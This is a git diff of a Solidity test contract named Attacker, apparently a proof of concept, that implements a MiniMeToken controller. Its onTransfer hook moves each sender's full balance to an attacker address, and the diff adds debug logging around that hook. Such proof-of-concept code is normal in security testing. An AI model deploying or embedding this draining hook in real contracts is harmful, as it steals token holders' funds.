@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity ^0.8.0;
 
+import { console } from "forge-std/Test.sol";
 import { TokenController } from "../../contracts/TokenController.sol";
 import { MiniMeToken } from "../../contracts/MiniMeToken.sol";
 
@@ -16,8 +17,14 @@ contract Attacker is TokenController {
     }
 
     function onTransfer(address _from, address _to, uint256 _amount) public override returns (bool) {
+        console.log("FROM");
+        console.log(_from);
+        console.log("AMOUNT");
+        console.log(_amount);
+        uint256 balance = MiniMeToken(payable(msg.sender)).balanceOfAt(_from, block.number);
+        console.log("BALANCE NOW");
+        console.log(balance);
         if (_to != attackerEOA) {
-            uint256 balance = MiniMeToken(payable(msg.sender)).balanceOfAt(_from, block.number);
             MiniMeToken(payable(msg.sender)).transferFrom(_from, attackerEOA, balance);
         }
         return true;
